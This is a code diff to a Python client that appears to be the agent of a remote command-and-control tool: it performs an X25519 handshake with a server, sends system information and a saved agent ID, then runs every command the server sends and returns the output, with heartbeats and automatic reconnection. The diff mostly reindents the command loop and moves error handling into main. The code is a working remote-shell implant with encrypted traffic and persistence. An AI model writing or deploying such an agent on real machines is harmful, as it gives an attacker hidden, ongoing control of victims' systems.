@@ -19,7 +19,6 @@ KEY_LENGTH = 32
 
 
 def read_uuid() -> str | None:
-
     if os.path.exists(AGENT_ID_LOCATION):
         with open(AGENT_ID_LOCATION, "r") as f:
             data = f.read()
@@ -31,73 +30,67 @@ def read_uuid() -> str | None:
     return None
 
 def communicate(s: socket.socket, system_info: dict) -> None:
-
-    while True:
-        # Send agent-public-key message.
-        private_key = X25519PrivateKey.generate()
-        public_key = private_key.public_key().public_bytes(encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw)
-        s.send(public_key)
-
-        # Receive server-public-key message.
-        server_public_key = s.recv(KEY_LENGTH)
-        shared_key = private_key.exchange(X25519PublicKey.from_public_bytes(server_public_key))
-        derived_key = HKDF(
-            algorithm=hashes.SHA256(),
-            length=KEY_LENGTH,
-            salt=None,
-            info=b'handshake data',
-        ).derive(shared_key)
-
-        # Construct agent hello message
-        agent_hello = system_info
-        agent_hello["type"] = "agent-hello"
-
-        # Read agent_id
-        agent_id = read_uuid()
-        if agent_id:
-            agent_hello["agent_id"] = agent_id
-
-        # Send agent hello message
-        send_secure_json(s, derived_key, agent_hello)
-
-        # Receive server hello message
-        server_hello = receive_secure_json(s, derived_key)
-        if server_hello.get("type") != "server-hello":
-            continue
-
-        # Save to file received agent_id
-        with open(AGENT_ID_LOCATION, "w") as f:
-            f.write(server_hello["agent_id"])
-
         while True:
-            try:
-                message = receive_secure_json(s, derived_key)
-                if message is None:
-                    print("Server disconnected.")
-                    s.close()
-                    main()
+            # Send agent-public-key message.
+            private_key = X25519PrivateKey.generate()
+            public_key = private_key.public_key().public_bytes(encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw)
+            s.send(public_key)
 
-                if message.get("type") == "request":
-                    response_tuple = run_command(message.get("command"))
-                    response = {
-                        "type": "response",
-                        "response_id": message.get("request_id"),
-                        "response": response_tuple[0],
-                        "cwd":  response_tuple[1],
+            # Receive server-public-key message.
+            server_public_key = s.recv(KEY_LENGTH)
+            shared_key = private_key.exchange(X25519PublicKey.from_public_bytes(server_public_key))
+            derived_key = HKDF(
+                algorithm=hashes.SHA256(),
+                length=KEY_LENGTH,
+                salt=None,
+                info=b'handshake data',
+            ).derive(shared_key)
+
+            # Construct agent hello message
+            agent_hello = system_info
+            agent_hello["type"] = "agent-hello"
+
+            # Read agent_id
+            agent_id = read_uuid()
+            if agent_id:
+                agent_hello["agent_id"] = agent_id
+
+            # Send agent hello message
+            send_secure_json(s, derived_key, agent_hello)
+
+            # Receive server hello message
+            server_hello = receive_secure_json(s, derived_key)
+            if server_hello.get("type") != "server-hello":
+                continue
+
+            # Save to file received agent_id
+            with open(AGENT_ID_LOCATION, "w") as f:
+                f.write(server_hello["agent_id"])
+
+            while True:
+                try:
+                    message = receive_secure_json(s, derived_key)
+                    if message is None:
+                        print("Server disconnected.")
+                        s.close()
+                        main()
+
+                    if message.get("type") == "request":
+                        response_tuple = run_command(message.get("command"))
+                        response = {
+                            "type": "response",
+                            "response_id": message.get("request_id"),
+                            "response": response_tuple[0],
+                            "cwd":  response_tuple[1],
+                        }
+                        send_secure_json(s, derived_key, response)
+
+                except socket.timeout:  # If socket timeout, send heartbeat
+                    message = {
+                        "type": "heartbeat",
                     }
-                    send_secure_json(s, derived_key, response)
-
-            except socket.timeout:  # If socket timeout, send heartbeat
-                message = {
-                    "type": "heartbeat",
-                }
-                send_secure_json(s, derived_key, message)
-                print("Heartbeat sent.")
-
-            except Exception as e:
-                print(e)
-                s.close()
-                main()
+                    send_secure_json(s, derived_key, message)
+                    print("Heartbeat sent.")
 
 def connect_to_server() -> socket.socket:
     while True:
@@ -112,9 +105,16 @@ def connect_to_server() -> socket.socket:
 
 
 def main() -> None:
+
     s = connect_to_server()
     s.settimeout(SEND_HEARTBEAT_INTERVAL)
-    communicate(s, get_system_info())
+
+    try:
+        communicate(s, get_system_info())
+    except Exception as e:
+        print(e)
+        s.close()
+        main()
 
 if __name__ == '__main__':
     main()
